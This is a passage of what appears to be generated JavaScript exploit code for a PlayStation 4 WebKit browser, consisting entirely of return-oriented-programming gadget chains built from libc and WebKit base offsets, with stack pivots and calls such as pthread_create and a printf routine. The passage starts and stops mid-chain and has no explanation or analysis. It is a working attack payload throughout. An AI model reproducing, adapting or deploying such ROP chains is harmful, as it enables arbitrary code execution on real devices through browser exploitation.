db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+763368 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+14664103, //and rax, rcx
libc_base+763368, //pop rcx
mmap_addr,
webkit_base+20307877, //mov [rax], rcx
libc_base+764760 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+731401, //mov rax, r8
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1143368, //L2348
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+782311 //pop rsp
]);
//L2348:
db([0, 0]); // 0x0
//L2331:
set_gadget(libc_base+764760,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+144605, //pop rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+764760, //pop rsi
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+1438842, //pop rdx
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+763368, //pop rcx
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+568675, //pop r8
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+3236123, //pop r9
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+756281, //xor rax, rax
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+11, //nop
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+11, //nop
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+764760, //pop rsi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+763368, //pop rcx
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+144605, //pop rdi
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+568675, //pop r8
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+782311, //pop rsp
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+763368 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+14664103, //and rax, rcx
libc_base+763368, //pop rcx
pthread_create_addr,
webkit_base+20307877, //mov [rax], rcx
libc_base+764760 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+731401, //mov rax, r8
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1144696, //L2349
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+782311 //pop rsp
]);
//L2349:
db([0, 0]); // 0x0
//__putchar:
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1144768, //L2350
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
webkit_base+568675 //pop r8
]);
//L2350:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1144856, //L2352
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1144888, //L2354
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2352:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2353:
db([0, 0]); // 0x0
set_gadget(webkit_base+568675,); //pop r8
//L2354:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2355:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1145000, //L2357
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1144984, //L2356
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2356:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2357:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1145136, //L2360
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1145120, //L2359
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605, //pop rdi
//L2358:
ropchain+136, //_ps4_printf_fd
libc_base+763368 //pop rcx
]);
//L2359:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2360:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1145296, //L2362
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1145328, //L2364
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1145280, //L2361
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1145312, //L2363
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2361:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2362:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2363:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2364:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1145408, //L2365
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1145424, //L2366
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2365:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2366:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1145552, //L2368
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1145568, //L2369
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1145536, //L2367
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2367:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2368:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2369:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
webkit_base+6378709, //cmp rax, rcx ; sete al
webkit_base+2115150, //setle al
libc_base+226597, //movzx eax, al
libc_base+764760, //pop rsi
ropchain+1145744, //L2371
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1145760, //L2372
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1145728, //L2370
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2370:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2371:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2372:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1145872, //L2374
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1145920, //L2377
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1145888, //L2375
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2374:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2375:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
//L2376:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2377:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+21212296, //cmp rax, rsi ; sete al
libc_base+226597, //movzx eax, al
webkit_base+5507491, //shl rax, 3
libc_base+764760, //pop rsi
ropchain+1146032, //L2378+8
libc_base+501454, //add rax, rsi
libc_base+501611, //mov rax, [rax]
libc_base+764760, //pop rsi
ropchain+1146024, //L2378
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+782311 //pop rsp
]);
//L2378:
db([0, 0]); // 0x0
set_gadgets([
ropchain+1146048, //L2378+24
ropchain+1146880, //L2373
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1146088, //L2379
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2379:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2380:
db([1, 0]); // 0x1
set_gadget(libc_base+759608,); //pop rax
//L2381:
db([1, 0]); // 0x1
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1146216, //L2383
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1146200, //L2382
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2382:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2383:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1146312, //L2385
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+764760 //pop rsi
]);
//L2384:
db([16, 0]); // 0x10
set_gadget(libc_base+759608,); //pop rax
//L2385:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1146456, //L2388
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1146440, //L2387
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605, //pop rdi
//L2386:
ropchain+136, //_ps4_printf_fd
libc_base+763368 //pop rcx
]);
//L2387:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2388:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1146616, //L2390
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1146648, //L2392
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1146600, //L2389
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1146632, //L2391
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2389:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2390:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2391:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2392:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1146744, //L2394
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1146728, //L2393
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2393:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2394:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608, //pop rax
//L2396:
ropchain+1146848, //L2395
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+782311, //pop rsp
ropchain+1149312, //L2397
//L2395:
libc_base+853989, //mov rax, rcx
libc_base+764760 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
//L2373:
libc_base+764760, //pop rsi
ropchain+1146936, //L2399
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2398:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L2399:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1147024, //L2401
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1147040, //L2402
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L2401:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2402:
db([0, 0]); // 0x0
set_gadgets([
libc_base+223440, //mov al, [rdi]
libc_base+764760, //pop rsi
ropchain+1147200, //L2407
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1147152, //L2404
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1147168, //L2405
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2404:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2405:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2406:
db([24, 0]); // 0x18
set_gadget(libc_base+759608,); //pop rax
//L2407:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+764760, //pop rsi
ropchain+1147256, //L2408
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+144605 //pop rdi
]);
//L2408:
db([0, 0]); // 0x0
set_gadgets([
libc_base+478984, //sar edi, cl
libc_base+764760, //pop rsi
ropchain+1147368, //L2410
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1147400, //L2412
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1147384, //L2411
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2410:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2411:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2412:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1147560, //L2416
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1147512, //L2413
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1147528, //L2414
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2413:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2414:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2415:
db([24, 0]); // 0x18
set_gadget(libc_base+759608,); //pop rax
//L2416:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+764760, //pop rsi
ropchain+1147616, //L2417
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+144605 //pop rdi
]);
//L2417:
db([0, 0]); // 0x0
set_gadgets([
libc_base+478984, //sar edi, cl
libc_base+764760, //pop rsi
ropchain+1147728, //L2419
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1147760, //L2421
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1147744, //L2420
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2419:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2420:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2421:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1147840, //L2422
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1147856, //L2423
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2422:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2423:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1148016, //L2427
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1147968, //L2424
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1147984, //L2425
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2424:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2425:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2426:
db([24, 0]); // 0x18
set_gadget(libc_base+759608,); //pop rax
//L2427:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+764760, //pop rsi
ropchain+1148072, //L2428
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+144605 //pop rdi
]);
//L2428:
db([0, 0]); // 0x0
set_gadgets([
libc_base+478984, //sar edi, cl
libc_base+764760, //pop rsi
ropchain+1148184, //L2430
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1148216, //L2432
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1148200, //L2431
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2430:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2431:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2432:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1148312, //L2434
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1148296, //L2433
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2433:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2434:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1148448, //L2437
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1148432, //L2436
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605, //pop rdi
//L2435:
ropchain+128, //_ps4_printf_buffer
libc_base+763368 //pop rcx
]);
//L2436:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2437:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1148592, //L2440
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1148560, //L2438
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1148576, //L2439
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2438:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2439:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2440:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1148680, //L2442
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+764760 //pop rsi
]);
//L2441:
db([1, 0]); // 0x1
set_gadget(libc_base+759608,); //pop rax
//L2442:
